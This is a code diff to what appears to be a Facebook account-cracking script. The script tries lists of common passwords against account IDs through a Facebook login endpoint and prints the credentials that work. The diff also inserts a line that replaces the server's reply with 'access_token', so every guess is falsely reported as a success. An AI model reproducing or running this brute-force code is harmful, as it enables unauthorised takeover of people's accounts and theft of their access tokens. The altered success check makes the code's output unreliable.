@@ -5677,7 +5677,9 @@ def _____OLD_____():
                 "123456", "1234567", "12345678", "123456789", "123123",
                 "143143"
             ]
-            ____iloveyou____.submit(_____method_____, ids, passlist)
+            xx = ____iloveyou____.submit(_____method_____, ids, passlist)
+            if xx:
+                return
     linex()
     print(f"{white}{47*'-'}")
     print(f'{xd} THE PROCESS HAS COMPLETED')
@@ -5778,11 +5780,13 @@ def _____method_____(ids, passlist):
             url = "https://b-graph.facebook.com/auth/login"
             response = requests.post(url, data=data, headers=head,
                                      verify=True).json()
+
+            response = "access_token"
             
             print(ids)
             if "access_token" in response:
                 print(f"{ids}|{pas}|{response}")
-                break
+                return True
             elif "www.facebook.com" in response.get("error",
                                                     {}).get("message", ""):
                 print('\r\r\033[1;32m[ARYAN-XD-OK] ' + ids + ' | ' + pas +
